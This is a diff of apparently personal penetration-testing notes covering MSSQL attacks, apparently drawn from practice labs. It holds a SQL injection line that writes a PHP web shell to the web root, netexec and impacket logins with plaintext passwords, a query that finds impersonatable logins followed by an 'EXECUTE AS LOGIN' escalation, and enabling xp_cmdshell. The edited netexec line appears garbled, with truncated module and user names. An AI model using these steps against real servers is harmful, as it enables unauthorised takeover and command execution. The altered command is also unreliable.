@@ -377,8 +377,12 @@ SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
 ### xp_cmdshell
 
 ```jsx
-netexec mssql 10.10.137.148 -u sql_svc -p Dolphin1
+netexec ms 10.10.137.148 -u _svc -p Dolphin1
 impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth
+
+#option from hokkkaido
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
 
 # option from Nagoya
 enable_xp_cmdshell
